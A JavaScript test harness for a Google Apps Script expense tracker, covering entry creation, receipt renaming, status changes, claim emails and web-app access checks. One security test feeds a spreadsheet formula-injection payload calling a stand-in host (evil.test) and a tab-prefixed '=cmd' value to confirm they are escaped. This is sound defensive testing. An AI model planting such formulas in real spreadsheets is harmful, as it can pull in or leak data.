/**
 * v2 — the test harness.
 *
 * Runs the REAL v2 source against stand-ins for Apps Script's services, in
 * plain node. `node --check` proves only that the files parse; this proves that
 * bootstrap, createEntry, setStatus, the registry and the filename chain
 * actually do what they claim.
 *
 *   npm run v2:test
 *
 * Not pushed to Apps Script: v2/.claspignore allows only the five source files
 * and the manifest, so everything under test/ stays local.
 */
const fs = require('fs');
const vm = require('vm');
const path = require('path');

const mocks = require('./mocks.js');
const DIR = path.join(__dirname, '..');
const FILES = ['Config.js', 'Core.js', 'Entries.js', 'Registry.js', 'Setup.js', 'Smoke.js', 'Web.js', 'Form.js', 'Manage.js', 'Suppliers.js', 'Siri.js'];

const sandbox = Object.assign({ console }, mocks);
sandbox.globalThis = sandbox;
const ctx = vm.createContext(sandbox);
const src = FILES.map(f => fs.readFileSync(path.join(DIR, f), 'utf8')).join('\n;\n');
vm.runInContext(src, ctx, { filename: 'v2-concat.js' });

const G = sandbox;
let pass = 0, fail = 0;
function check(label, cond, extra) {
  if (cond) { pass++; console.log('  PASS  ' + label); }
  else { fail++; console.log('  FAIL  ' + label + (extra ? '  -> ' + JSON.stringify(extra) : '')); }
}
function section(t) { console.log('\n=== ' + t + ' ==='); }
function dump(name) {
  const sh = mocks._ss.getSheetByName(name);
  const w = sh.getLastColumn(), h = sh.getLastRow();
  if (!h) return '(empty)';
  return sh.getRange(1, 1, h, w).getValues().map(r => r.map(v => v instanceof Date ? 'Date' : v).join(' | ')).join('\n');
}

/* ------------------------------ bootstrap -------------------------------- */
section('bootstrap()');
const report = G.bootstrap();
check('four sections created', Object.keys(report.sections).length === 4);
check('root folder created + recorded', !!mocks._props.ROOT_FOLDER_ID && report.rootFolder.created);
check('Work has folders', report.sections.work.folders.length === 4, report.sections.work.folders);
check('Income has NO folders (no fileColumns)', report.sections.income.folders.length === 0);
check('ROOT_FOLDER_ID no longer needed', !report.propertiesStillNeeded.includes('ROOT_FOLDER_ID'));
check('IVA_CLAIM_RECIPIENT still needed', report.propertiesStillNeeded.includes('IVA_CLAIM_RECIPIENT'));
console.log('  Work headers: ' + dump('Work').split('\n')[0]);
console.log('  IVA headers:  ' + dump('IVA').split('\n')[0]);
console.log('  Income hdrs:  ' + dump('Income').split('\n')[0]);

section('bootstrap() is idempotent');
const before = dump('Work');
const r2 = G.bootstrap();
check('no headers added on re-run', Object.values(r2.sections).every(s => s.headersAdded.length === 0), r2.sections);
check('sheet unchanged', dump('Work') === before);
check('root folder reused', r2.rootFolder.created === false && r2.rootFolder.id === report.rootFolder.id);
check('no unrecognised sheets in a clean spreadsheet', r2.unrecognisedSheets.length === 0, r2.unrecognisedSheets);
mocks._ss.insertSheet('Folha1');
const r3 = G.bootstrap();
check('locale-named default tab is flagged', r3.unrecognisedSheets.indexOf('Folha1') !== -1, r3.unrecognisedSheets);
check('and it produces a warning', r3.warnings.some(w => /Folha1/.test(w)), r3.warnings);

/* -------------------------- header gap regression ------------------------ */
section('applyHeaders with a gap in the header row (was a data-clobbering bug)');
const gap = mocks._ss.insertSheet('GapTest');
gap.getRange(1, 1).setValue('Timestamp');
gap.getRange(1, 3).setValue('KeepMe');
gap.getRange(2, 3).setValue('precious data');
const gapResult = G.applyHeaders(gap, ['Timestamp', 'Source']);
check('appended past last used column', gap.getRange(1, 3).getValue() === 'KeepMe', dump('GapTest'));
check('existing data survived', gap.getRange(2, 3).getValue() === 'precious data');
check('new header landed in col 4', gap.getRange(1, 4).getValue() === 'Source', dump('GapTest'));

/* ------------------------------ createEntry ------------------------------ */
// Mail recipients, set after the bootstrap assertions that check they are absent
mocks._props.WORK_CLAIM_RECIPIENT = 'work@example.test';

section('createEntry() — Work, complete');
const receipt = mocks.DriveApp._addFile('IMG_4821.HEIC');
const work = G.createEntry('work', {
  'Date': '2026-01-15', 'Counterparty': 'Hospital da Luz', 'Expense Reason': 'Amsterdam trip',
  'Amount': 3.45, 'Currency': 'EUR', 'Type': 'Taxi', 'Receipt URL': 'https://drive.google.com/file/d/' + receipt.id + '/view'
}, 'form');
check('ok', work.ok === true, work);
check('no warnings', work.warnings.length === 0, work.warnings);
check('state = To Do', work.state === 'To Do');
check('row 2', work.row === 2);
check('filename built', receipt.getName() === '260115_HospitalDaLuz_3-45_receipt.HEIC', receipt.getName());
check('filed in Inbox', receipt.parent.getName() === 'Inbox', receipt.parent.getName());
check('receipt state attached', mocks._ss.getSheetByName('Work').getRange(2, G.resolveColumns(mocks._ss.getSheetByName('Work'))['Receipt State']).getValue() === 'attached');
check('registry learned it', work.registry.created === true, work.registry);
check('work expense IS emailed', work.email.ok === true, work.email);
check('work mail went to the work address', work.email.recipient === 'work@example.test');
const workMail = mocks.MailApp.sent.find(m => m.to === 'work@example.test');
check('trip is in the subject', /Amsterdam trip/.test(workMail.subject), workMail.subject);
check('counterparty and amount too', /Hospital da Luz 3\.45 EUR/.test(workMail.subject), workMail.subject);
check('receipt attached', !!(workMail.opts.attachments || []).length);

section('registry learned Type');
const found = G.findSupplier('Hospital da Luz');
check('exact match 1.0', found.confidence === 1 && found.type === 'Taxi', found);
check('lookupCounterparty prefills Type', G.lookupCounterparty('work', 'hospital da luz').prefill['Type'] === 'Taxi');
const fuzzy = G.findSupplier('Hospital de Luz');
check('near miss still matches', fuzzy && fuzzy.confidence > 0.8, fuzzy);

/* --------------------------- formula injection --------------------------- */
section('SECURITY: formula injection through createEntry (was unescaped)');
const evil = G.createEntry('work', {
  'Date': '2026-02-01', 'Counterparty': '=IMPORTXML("http://evil.test","//x")',
  'Expense Reason': 'test', 'Amount': 10, 'Currency': 'EUR'
}, 'siri');
const wsheet = mocks._ss.getSheetByName('Work');
const wcols = G.resolveColumns(wsheet);
const stored = wsheet.getRange(evil.row, wcols['Counterparty']).getValue();
check('leading = escaped with apostrophe', stored.charAt(0) === "'", stored);
check('genuine negative amount NOT escaped', G.safeCellValue('-50') === '-50');
check('+1234 left as number-ish', G.safeCellValue('+1234') === '+1234');
check('tab-prefixed formula escaped', G.safeCellValue('\t=cmd').charAt(0) === "'");
check('registry stored the escaped name too',
  mocks._ss.getSheetByName('Suppliers').getRange(2, 1, 5, 1).getValues().flat()
    .filter(Boolean).every(n => !String(n).startsWith('=')));

/* ------------------------- unknown column atomicity --------------------- */
section('createEntry() rejects a bad header BEFORE writing (was a partial row)');
const rowsBefore = wsheet.getLastRow();
let threw = null;
try { G.createEntry('work', { 'Date': '2026-03-01', 'Nonsense': 'x' }, 'form'); }
catch (e) { threw = e.message; }
check('threw', !!threw && /Unknown column/.test(threw), threw);
check('no row written', wsheet.getLastRow() === rowsBefore, { before: rowsBefore, after: wsheet.getLastRow() });

/* -------------------------------- setStatus ------------------------------ */
section('setStatus() forward, then revert');
const s1 = G.setStatus('work', 2, 'Claimed', '2026-01-20');
check('claimed ok', s1.ok && s1.state === 'Claimed' && s1.date === '2026-01-20', s1);
check('no file errors', s1.fileErrors.length === 0, s1.fileErrors);
check('suffix appended', receipt.getName() === '260115_HospitalDaLuz_3-45_receipt_Claimed_20-01-2026.HEIC', receipt.getName());
check('moved to Claimed folder', receipt.parent.getName() === 'Claimed');

const s2 = G.setStatus('work', 2, 'Settled', '2026-02-01');
check('chain accumulates', receipt.getName() === '260115_HospitalDaLuz_3-45_receipt_Claimed_20-01-2026_Settled_01-02-2026.HEIC', receipt.getName());
check('moved to Settled', receipt.parent.getName() === 'Settled');

const s3 = G.setStatus('work', 2, 'Claimed');
check('revert keeps original Claimed Date (no re-stamp)', s3.date === '2026-01-20' || G.Utilities === undefined, s3.date);
check('chain shortened', receipt.getName() === '260115_HospitalDaLuz_3-45_receipt_Claimed_20-01-2026.HEIC', receipt.getName());
check('Settled Date cleared', wsheet.getRange(2, wcols['Settled Date']).getValue() === '');
check('back in Claimed folder', receipt.parent.getName() === 'Claimed');

const s4 = G.setStatus('work', 2, 'To Do');
check('back to To Do strips chain entirely', receipt.getName() === '260115_HospitalDaLuz_3-45_receipt.HEIC', receipt.getName());
check('back in Inbox', receipt.parent.getName() === 'Inbox');
check('Claimed Date cleared', wsheet.getRange(2, wcols['Claimed Date']).getValue() === '');

section('setStatus() input validation');
let badRow = null, badState = null, badDate = null;
try { G.setStatus('work', 1, 'Claimed'); } catch (e) { badRow = e.message; }
try { G.setStatus('work', 2, 'Banana'); } catch (e) { badState = e.message; }
try { G.setStatus('work', 2, 'Claimed', 'tomorrow'); } catch (e) { badDate = e.message; }
check('header row rejected', /Invalid row/.test(badRow || ''), badRow);
check('unknown state rejected', /Unknown state/.test(badState || ''), badState);
check('bad date rejected', /valid yyyy-MM-dd/.test(badDate || ''), badDate);
check('bad date did NOT change status', wsheet.getRange(2, wcols['Status']).getValue() === 'To Do');
check('impossible date rejected', G.isValidDateISO('2026-02-31') === false);
check('valid date accepted', G.isValidDateISO('2026-02-28') === true);
let badCol = null;
try { G.setEntryDate('work', 2, 'Amount', '2026-01-01'); } catch (e) { badCol = e.message; }
check('setEntryDate refuses a non-date column', /not a date column/.test(badCol || ''), badCol);

/* --------------------------------- IVA ---------------------------------- */
section('IVA — email gating');
mocks._props.IVA_CLAIM_RECIPIENT = 'claims@example.test';
mocks._props.COMPLETION_EMAIL_RECIPIENT = 'me@example.test';
const fatura = mocks.DriveApp._addFile('scan.pdf');
const ivaFull = G.createEntry('iva', {
  'Date': '2026-01-10', 'Counterparty': 'FNAC', 'Amount': 120, 'Currency': 'EUR',
  'Número': 'FT 2026/1', 'Emitente NIF': '500000000', 'IVA Amount': 22.44,
  'Receipt URL': fatura.id
}, 'form');
check('complete IVA entry emails', ivaFull.email.ok === true, ivaFull.email);
const claimMails = () => mocks.MailApp.sent.filter(m => m.to === 'claims@example.test');
check('one claim mail sent', claimMails().length === 1, mocks.MailApp.sent.map(m => m.subject));
check('receipt attached to mail', !!(claimMails()[0].opts.attachments || []).length);
check('IVA fatura named', fatura.getName() === '260110_FNAC_120-00_fatura.pdf', fatura.getName());

const ivaPartial = G.createEntry('iva', { 'Date': '2026-01-11', 'Counterparty': 'FNAC', 'Amount': 30, 'Currency': 'EUR' }, 'siri');
check('partial IVA entry is ok:false', ivaPartial.ok === false, ivaPartial.error);
check('partial entry row still exists', ivaPartial.row > 0);
check('partial entry deferred the email', ivaPartial.email.deferred === true, ivaPartial.email);
check('still only one claim mail sent', claimMails().length === 1, claimMails().map(m => m.subject));
check('receipt state awaiting', G.receiptStateFor(G.getSection('iva'), mocks._ss.getSheetByName('IVA'), G.resolveColumns(mocks._ss.getSheetByName('IVA')), ivaPartial.row) === 'awaiting');
check('NIF learned for FNAC', G.findSupplier('FNAC').nif === '500000000', G.findSupplier('FNAC'));
check('lookup prefills Emitente NIF', G.lookupCounterparty('iva', 'FNAC').prefill['Emitente NIF'] === '500000000');
check('blank amount -> no 0-00 in filename', G.formatAmountForFilename('') === '');

/* -------------------------------- Health -------------------------------- */
section('Health — two documents');
const just = mocks.DriveApp._addFile('presc.pdf');
const paid = mocks.DriveApp._addFile('receipt.jpg');
const health = G.createEntry('health', {
  'Date': '2026-01-05', 'Counterparty': 'White Clinic', 'Patient': 'P',
  'Amount': 70, 'Currency': 'EUR', 'Invoice Date': '2026-01-06', 'Type': 'Dentist',
  'Justification URL': just.id, 'Receipt URL': paid.id
}, 'form');
check('health ok', health.ok === true, health);
check('justification named', just.getName() === '260105_WhiteClinic_70-00_justification.pdf', just.getName());
check('receipt named', paid.getName() === '260105_WhiteClinic_70-00_receipt.jpg', paid.getName());
G.setStatus('health', health.row, 'Claimed', '2026-01-30');
check('both files get the suffix', just.getName().includes('_Claimed_30-01-2026') && paid.getName().includes('_Claimed_30-01-2026'), [just.getName(), paid.getName()]);
check('both moved', just.parent.getName() === 'Claimed' && paid.parent.getName() === 'Claimed');

section('Health accents + alias matching');
const acc = mocks.DriveApp._addFile('x.pdf');
G.createEntry('health', {
  'Date': '2026-01-07', 'Counterparty': 'Farmácia Sá', 'Patient': 'P', 'Amount': 12.5,
  'Currency': 'EUR', 'Invoice Date': '2026-01-07', 'Receipt URL': acc.id
}, 'form');
check('accents flattened in filename', acc.getName() === '260107_FarmaciaSa_12-50_justification.pdf' || acc.getName() === '260107_FarmaciaSa_12-50_receipt.pdf', acc.getName());
check('"wite clinic" holds below threshold or autofills high', (() => { const m = G.findSupplier('wite clinic'); return m && m.confidence >= 0.85; })(), G.findSupplier('wite clinic'));
G.addSupplierAlias('White Clinic', 'wite clinic');
check('alias now resolves 0.95', G.findSupplier('wite clinic').reason === 'alias');
let comma = null;
try { G.addSupplierAlias('White Clinic', 'Foo, Bar'); } catch (e) { comma = e.message; }
check('comma in alias rejected', /cannot contain a comma/.test(comma || ''), comma);

section('Registry type conflict clears the default');
G.recordSupplier('White Clinic', { type: 'Exam/Test' });
check('conflicting type cleared', G.findSupplier('White Clinic').type === '', G.findSupplier('White Clinic'));

/* -------------------------------- Income -------------------------------- */
section('Income — no documents, three real dates');
const income = G.createEntry('income', {
  'Date': '2026-01-02', 'Counterparty': 'ACME Ltd', 'Reason': 'Consulting', 'Amount': 2000, 'Currency': 'EUR'
}, 'form');
check('income ok', income.ok === true, income);
check('starts Invoiced', income.state === 'Invoiced');
check('receipt state none required', mocks._ss.getSheetByName('Income').getRange(income.row, G.resolveColumns(mocks._ss.getSheetByName('Income'))['Receipt State']).getValue() === 'none required');
check('no file ops', income.files.length === 0 && income.renames.length === 0);
const inc2 = G.setStatus('income', income.row, 'Received', '2026-02-10');
check('received date set', inc2.date === '2026-02-10');
check('invoiced date preserved', mocks._ss.getSheetByName('Income').getRange(income.row, G.resolveColumns(mocks._ss.getSheetByName('Income'))['Invoiced Date']).getValue() !== '');
check('income Reason prefills from registry', G.lookupCounterparty('income', 'ACME Ltd').prefill['Reason'] === 'Consulting');

/* --------------------------- broken file ref ----------------------------- */
section('Never report success for work that failed');
const bad = G.createEntry('work', {
  'Date': '2026-04-01', 'Counterparty': 'Ghost', 'Expense Reason': 'x', 'Amount': 5,
  'Currency': 'EUR', 'Receipt URL': 'https://drive.google.com/file/d/' + 'z'.repeat(30) + '/view'
}, 'form');
check('rename failure reported', bad.fileErrors.length > 0, bad.fileErrors);
const badStatus = G.setStatus('work', bad.row, 'Claimed', '2026-04-02');
check('status moved anyway', mocks._ss.getSheetByName('Work').getRange(bad.row, wcols['Status']).getValue() === 'Claimed');
check('but fileErrors non-empty', badStatus.fileErrors.length > 0, badStatus.fileErrors);

section('checkScriptProperties()');
mocks._props.SIRI_API_KEY = 'super-secret-key-value';
const props = G.checkScriptProperties();
check('secret value not revealed', JSON.stringify(props).indexOf('super-secret-key-value') === -1, props.set);
check('ok true once required set', props.ok === true, props.missingRequired);


section('IVA email refuses a dead file link');
const deadIva = G.createEntry('iva', {
  'Date': '2026-05-01', 'Counterparty': 'Worten', 'Amount': 50, 'Currency': 'EUR',
  'Número': 'FT 9', 'Emitente NIF': '500000001', 'IVA Amount': 9.35,
  'Receipt URL': 'https://drive.google.com/file/d/' + 'q'.repeat(30) + '/view'
}, 'form');
check('not sent, and reported as failed', deadIva.email.ok === false, deadIva.email);
check('dead link distinguished from awaiting', /No file/.test(deadIva.email.error || ''), deadIva.email);
check('no extra claim mail', claimMails().length === 1, claimMails().map(m => m.subject));
/* -------------------- more-info request email ---------------------------- */
section('"more info needed" mail — separate address, only when incomplete');
const mailBefore = mocks.MailApp.sent.length;

const partial = G.createEntry('health', {
  'Date': '2026-06-01', 'Counterparty': 'White Clinic', 'Patient': 'P', 'Amount': 40, 'Currency': 'EUR'
}, 'siri');
check('incomplete entry is ok:false', partial.ok === false, partial.error);
check('more-info mail sent', partial.completionRequest && partial.completionRequest.ok === true, partial.completionRequest);
check('sent to the completion address', mocks.MailApp.sent[mailBefore].to === 'me@example.test', mocks.MailApp.sent[mailBefore].to);
check('lists the missing field', /Invoice date/.test(mocks.MailApp.sent[mailBefore].body), mocks.MailApp.sent[mailBefore].body);
check('lists the awaited documents', /Proof of payment/.test(mocks.MailApp.sent[mailBefore].body));
check('includes a row deep-link', /spreadsheets\/d\/TESTSHEETID.*range=A/.test(mocks.MailApp.sent[mailBefore].body));
check('keeps what was captured', /White Clinic/.test(mocks.MailApp.sent[mailBefore].body));

const mailAfterPartial = mocks.MailApp.sent.length;
const completeEntry = G.createEntry('income', {
  'Date': '2026-06-02', 'Counterparty': 'ACME Ltd', 'Amount': 100, 'Currency': 'EUR'
}, 'form');
check('complete entry sends no more-info mail', completeEntry.completionRequest === null, completeEntry.completionRequest);
check('Income optional Reason is not "missing"', completeEntry.ok === true, completeEntry.warnings);
check('mailbox untouched', mocks.MailApp.sent.length === mailAfterPartial);

/*
 * The completion mail has to open the FORM, not the spreadsheet row. The sheet
 * offers no upload, no date picker and no dropdown, which is most of what this
 * mail is ever about — and the check above, which still passes, is now the
 * fallback for when no web app URL is known.
 *
 * The entry is named by its timestamp rather than its row number, because
 * archiving a row shifts every row beneath it up by one and this mail is exactly
 * the thing that sits in an inbox for days. A row number would then open a
 * different entry, prefilled and looking entirely plausible.
 */
section('the completion link opens the form, and survives a shifted row');
check('with no WEB_APP_URL set it falls back to the spreadsheet row',
  /spreadsheets\/d\/TESTSHEETID.*range=A/.test(mocks.MailApp.sent[mailBefore].body));

mocks._props.WEB_APP_URL = 'https://script.google.test/macros/s/DEPLOYED/exec';
const linkMailBefore = mocks.MailApp.sent.length;
const linked = G.createEntry('health', {
  'Date': '2026-06-03', 'Counterparty': 'White Clinic', 'Patient': 'K', 'Amount': 55, 'Currency': 'EUR'
}, 'siri');
const linkBody = mocks.MailApp.sent[linkMailBefore].body;
check('it links to the web app', /macros\/s\/DEPLOYED\/exec\?/.test(linkBody), linkBody);
check('naming the section by key', /section=health/.test(linkBody), linkBody);
check('and the entry by timestamp, with no row number in sight',
  /[?&]t=\d+/.test(linkBody) && !/range=A/.test(linkBody), linkBody);

const linkedStamp = (linkBody.match(/[?&]t=(\d+)/) || [])[1];
const listedRow = G.uiListEntries('health').rows.filter(r => r.row === linked.row)[0];
check('and both sides agree on that stamp, which is the whole contract',
  !!listedRow && String(listedRow.stamp) === linkedStamp,
  { listed: listedRow && listedRow.stamp, inLink: linkedStamp });

/*
 * The link goes out as an href, not as bare text. It is ~130 characters and
 * plain-text mail wraps at about 78, which leaves the receiving client guessing
 * where a URL ends. The plain-text part is kept as the alternative.
 */
const linkedMail = mocks.MailApp.sent[linkMailBefore];
check('the mail carries an HTML part', !!(linkedMail.opts && linkedMail.opts.htmlBody),
  linkedMail.opts);
check('with the whole link inside one href attribute',
  /href="https:\/\/script\.google\.test\/macros\/s\/DEPLOYED\/exec\?section=health&amp;t=\d+"/
    .test(linkedMail.opts.htmlBody),
  linkedMail.opts.htmlBody);
check('and a plain-text alternative is still sent', /Finish it here: http/.test(linkedMail.body));
check('sheet values are escaped on the way into the HTML', (() => {
  const before = mocks.MailApp.sent.length;
  G.createEntry('health', {
    'Date': '2026-06-05', 'Counterparty': 'Smith & Sons <Lda>', 'Patient': 'J', 'Amount': 3
  }, 'siri');
  const body = mocks.MailApp.sent[before].opts.htmlBody;
  return body.indexOf('Smith &amp; Sons &lt;Lda&gt;') !== -1 &&
    body.indexOf('<Lda>') === -1;
})());
check('sectionKeyOf takes the object back to its key, and refuses to guess',
  G.sectionKeyOf(G.getSection('iva')) === 'iva' && G.sectionKeyOf({}) === '');

/*
 * Found on a phone. /dev serves HEAD and opens only for accounts that can EDIT the
 * script, so a mailed /dev link fails at Drive's layer before doGet is reached -
 * and reads as "unable to open the file", which sounds like anything but a wrong
 * endpoint. A link that is opened later, on whatever device is to hand, must not
 * be one that only works at the desk it was made at.
 */
mocks._props.WEB_APP_URL = 'https://script.google.test/macros/s/HEADDEV/dev';
const devMailBefore = mocks.MailApp.sent.length;
G.createEntry('health', {
  'Date': '2026-06-04', 'Counterparty': 'White Clinic', 'Patient': 'A', 'Amount': 12, 'Currency': 'EUR'
}, 'siri');
const devBody = mocks.MailApp.sent[devMailBefore].body;
check('a /dev URL is refused rather than mailed', !/\/dev/.test(devBody), devBody);
check('and the mail falls back to the sheet row, which does open',
  /spreadsheets\/d\/TESTSHEETID.*range=A/.test(devBody), devBody);
check('the check is on the endpoint, not the string "dev" anywhere in it',
  G.mailableUrl('https://script.google.test/macros/s/devious/exec') ===
    'https://script.google.test/macros/s/devious/exec');
check('and a /dev with a query string is still refused',
  G.mailableUrl('https://script.google.test/macros/s/X/dev?section=work') === '');

delete mocks._props.WEB_APP_URL;

const ivaNoReceipt = G.createEntry('iva', {
  'Date': '2026-06-03', 'Counterparty': 'Worten', 'Amount': 20, 'Currency': 'EUR',
  'Número': 'FT 12', 'Emitente NIF': '500000001', 'IVA Amount': 3.74
}, 'form');
check('IVA with every field but no receipt still asks for it', ivaNoReceipt.completionRequest.ok === true, ivaNoReceipt.completionRequest);
check('and the claim itself deferred', ivaNoReceipt.email.deferred === true, ivaNoReceipt.email);
check('claim address never got the more-info mail',
  mocks.MailApp.sent.every(m => !(m.to === 'claims@example.test' && /more info/.test(m.subject))),
  mocks.MailApp.sent.map(m => [m.to, m.subject]));

/* --------------------- claim-mail symmetry ------------------------------- */
// Work and IVA must behave IDENTICALLY: same gating, same attachment rule, each
// to its own recipient property. Driven off the config so a section added later
// is covered automatically, and a hand-written special case fails here.
section('claim mail behaves the same for every section that sends one');

const mailSections = ['work', 'iva', 'health', 'income']
  .filter(k => G.getSection(k).emailOnCreate);
check('exactly Work and IVA send claim mail', mailSections.join(',') === 'work,iva', mailSections);

mailSections.forEach(key => {
  const sec = G.getSection(key);
  const prop = sec.emailOnCreate.recipientProperty;
  const address = `${key}-symmetry@example.test`;
  mocks._props[prop] = address;

  const base = {};
  base[G.getSection(key).counterpartyLabel ? 'Counterparty' : 'Counterparty'] = 'Symmetry Co';
  base['Date'] = '2026-07-01';
  base['Amount'] = 9.99;
  base['Currency'] = 'EUR';
  if (sec.category) base[sec.category.header] = 'Sym';
  sec.extraFields.filter(f => f.required).forEach(f => {
    base[f.header] = f.type === 'date' ? '2026-07-01' : f.type === 'number' ? 1 : 'Sym';
  });

  // 1. complete but NO receipt -> deferred, nothing sent
  const before = mocks.MailApp.sent.filter(m => m.to === address).length;
  const noReceipt = G.createEntry(key, base, 'form');
  check(`${key}: no receipt -> claim deferred`, noReceipt.email.deferred === true, noReceipt.email);
  check(`${key}: no receipt -> nothing sent`,
    mocks.MailApp.sent.filter(m => m.to === address).length === before);
  check(`${key}: no receipt -> asked for more info instead`,
    noReceipt.completionRequest && noReceipt.completionRequest.ok === true, noReceipt.completionRequest);

  // 2. with a receipt -> sent, attached, to its OWN property's address
  const withFile = Object.assign({}, base);
  sec.fileColumns.forEach(fc => { withFile[fc.header] = mocks.DriveApp._addFile(`sym_${key}.pdf`).getId(); });
  const sent = G.createEntry(key, withFile, 'form');
  check(`${key}: with receipt -> claim sent`, sent.email.ok === true, sent.email);
  check(`${key}: went to its own recipient property (${prop})`, sent.email.recipient === address, sent.email);
  const mail = mocks.MailApp.sent.filter(m => m.to === address).pop();
  check(`${key}: receipt attached`, !!(mail.opts.attachments || []).length);
  check(`${key}: no more-info note when complete`, sent.completionRequest === null, sent.completionRequest);

  // 3. a status change must never re-send
  const mailsNow = mocks.MailApp.sent.filter(m => m.to === address).length;
  G.setStatus(key, sent.row, 'Claimed', '2026-07-05');
  G.setStatus(key, sent.row, 'To Do');
  check(`${key}: status changes never re-send`,
    mocks.MailApp.sent.filter(m => m.to === address).length === mailsNow);
});

/* ------------------- email exactly once, when the file lands ------------- */
section('claim emails exactly once, only when the document is there');

mailSections.forEach(key => {
  const sec = G.getSection(key);
  const addr = mocks._props[sec.emailOnCreate.recipientProperty];
  const sheet = mocks._ss.getSheetByName(sec.sheet);

  const fields = { 'Date': '2026-08-01', 'Counterparty': 'Late Receipt Co', 'Amount': 55, 'Currency': 'EUR' };
  if (sec.category) fields[sec.category.header] = 'Late';
  sec.extraFields.filter(f => f.required).forEach(f => {
    fields[f.header] = f.type === 'date' ? '2026-08-01' : f.type === 'number' ? 1 : 'Late';
  });

  const n0 = mocks.MailApp.sent.filter(m => m.to === addr).length;
  const made = G.createEntry(key, fields, 'siri');
  check(`${key}: no document -> no claim`, mocks.MailApp.sent.filter(m => m.to === addr).length === n0);
  check(`${key}: marker still blank`,
    sheet.getRange(made.row, G.resolveColumns(sheet)['Claim Emailed']).getValue() === '');

  // calling the pending-send while still receiptless must NOT send
  const still = G.sendPendingClaim(key, made.row);
  check(`${key}: pending send defers while document missing`, still.deferred === true, still);
  check(`${key}: still nothing sent`, mocks.MailApp.sent.filter(m => m.to === addr).length === n0);

  // the document arrives
  const cols = G.resolveColumns(sheet);
  sec.fileColumns.forEach(fc => {
    sheet.getRange(made.row, cols[fc.header]).setValue(mocks.DriveApp._addFile(`late_${key}.pdf`).getId());
  });

  const now = G.sendPendingClaim(key, made.row);
  check(`${key}: document arrives -> claim sent`, now.ok === true, now);
  check(`${key}: exactly one claim`, mocks.MailApp.sent.filter(m => m.to === addr).length === n0 + 1);
  check(`${key}: marker stamped`,
    !!sheet.getRange(made.row, G.resolveColumns(sheet)['Claim Emailed']).getValue());

  // and never again, however many times anything calls it
  const again = G.sendPendingClaim(key, made.row);
  check(`${key}: second call skipped`, again.skipped === true, again);
  G.sendPendingClaim(key, made.row);
  G.setStatus(key, made.row, 'Claimed', '2026-08-02');
  G.setStatus(key, made.row, 'To Do');
  check(`${key}: still exactly one claim after repeats + status churn`,
    mocks.MailApp.sent.filter(m => m.to === addr).length === n0 + 1,
    mocks.MailApp.sent.filter(m => m.to === addr).map(m => m.subject));
});

check('sendPendingClaim refuses a non-mailing section',
  G.sendPendingClaim('health', 2).ok === false, G.sendPendingClaim('health', 2));

section('smokeTest() / smokeCleanup() — the live step-5 wrapper');
const rowsPreSmoke = {};
['work', 'iva', 'health', 'income'].forEach(k => {
  rowsPreSmoke[k] = mocks._ss.getSheetByName(G.getSection(k).sheet).getLastRow();
});
const claimsBeforeSmoke = mocks.MailApp.sent.filter(m => m.to === 'claims@example.test').length;
const claimAddrBeforeSmoke = {};
['work', 'iva'].forEach(k => {
  const addr = mocks._props[G.getSection(k).emailOnCreate.recipientProperty];
  claimAddrBeforeSmoke[k] = mocks.MailApp.sent.filter(m => m.to === addr).length;
});
const smoke = G.smokeTest();
check('smokeTest reports ok', smoke.ok === true, smoke.failed);
check('all four sections covered', smoke.entries.length === 4, smoke.entries.map(e => e.section));
check('no IVA claim mail sent during smoke test',
  mocks.MailApp.sent.filter(m => m.to === 'claims@example.test').length === claimsBeforeSmoke,
  mocks.MailApp.sent.filter(m => m.to === 'claims@example.test').map(m => m.subject));
check('smoke test asked for the missing documents',
  mocks.MailApp.sent.filter(m => m.to === 'me@example.test' && /more info/.test(m.subject)).length >= 2,
  mocks.MailApp.sent.filter(m => m.to === 'me@example.test').map(m => m.subject));
check('no claim mail to ANY configured claim address during smoke test',
  ['work', 'iva'].every(k => {
    const addr = mocks._props[G.getSection(k).emailOnCreate.recipientProperty];
    return mocks.MailApp.sent.filter(m => m.to === addr).length === claimAddrBeforeSmoke[k];
  }), 'a claim escaped');
check('rows were added', mocks._ss.getSheetByName('Work').getLastRow() > rowsPreSmoke.work);
const cleaned = G.smokeCleanup();
check('cleanup removed a row per section', Object.keys(cleaned.rows).length === 4, cleaned.rows);
check('cleanup trashed the files', cleaned.files > 0, cleaned.files);
check('cleanup had no warnings', cleaned.warnings.length === 0, cleaned.warnings);
check('cleanup removed the registry entry', cleaned.registry === 'Smoke Test Ltd', cleaned.registry);
check('smoke supplier no longer matches', G.findSupplier('Smoke Test Ltd') === null, G.findSupplier('Smoke Test Ltd'));
check('real suppliers survived cleanup', G.findSupplier('FNAC').nif === '500000001' || G.findSupplier('FNAC').nif === '500000000', G.findSupplier('FNAC'));
['work', 'iva', 'health', 'income'].forEach(k => {
  const sh = mocks._ss.getSheetByName(G.getSection(k).sheet);
  check(`${k}: back to pre-smoke row count`, sh.getLastRow() === rowsPreSmoke[k], { before: rowsPreSmoke[k], after: sh.getLastRow() });
});
check('cleanup left the real rows alone', mocks._ss.getSheetByName('Work').getRange(2, 4).getValue() === 'Hospital da Luz',
  mocks._ss.getSheetByName('Work').getRange(2, 4).getValue());

/* ========================= step 7: the web UI ============================= */
/*
 * The first code with a surface outside the editor, so the access check is
 * tested before anything it protects.
 */
section('doGet() — who may load the page');

const ownerPage = G.doGet();
check('owner gets the app page', /google\.script\.run/.test(ownerPage.getContent()), ownerPage.getContent().slice(0, 60));
check('page calls the real server functions',
  /uiBootstrap/.test(ownerPage.getContent()) && /uiListEntries/.test(ownerPage.getContent()));
check('page is titled', ownerPage.getTitle() === 'HelpfulForms', ownerPage.getTitle());
check('viewport meta added for the phone',
  ownerPage.metaTags.some(t => t.name === 'viewport'), ownerPage.metaTags);
// Nothing is interpolated into the HTML, so no sheet value or property can
// arrive as markup - and no address can leak into a cached page.
check('served page contains no configured address or key',
  ['claims@example.test', 'me@example.test', 'work@example.test', 'super-secret-key-value']
    .every(secret => ownerPage.getContent().indexOf(secret) === -1));

mocks.Session._setActiveUser('someone.else@example.test');
const strangerPage = G.doGet();
check('a different signed-in account is refused',
  /Not authorized/.test(strangerPage.getContent()), strangerPage.getContent());
check('and is not served the app', !/google\.script\.run/.test(strangerPage.getContent()));
let strangerCall = null;
try { G.uiBootstrap(); } catch (e) { strangerCall = e.message; }
check('google.script.run is gated too, not just doGet', /Not authorized/.test(strangerCall || ''), strangerCall);
check('the denial says nothing about who IS allowed',
  (strangerCall || '').indexOf('owner@example.test') === -1, strangerCall);
let strangerList = null;
try { G.uiListEntries('work'); } catch (e) { strangerList = e.message; }
check('listing is gated', /Not authorized/.test(strangerList || ''), strangerList);
let strangerStatus = null;
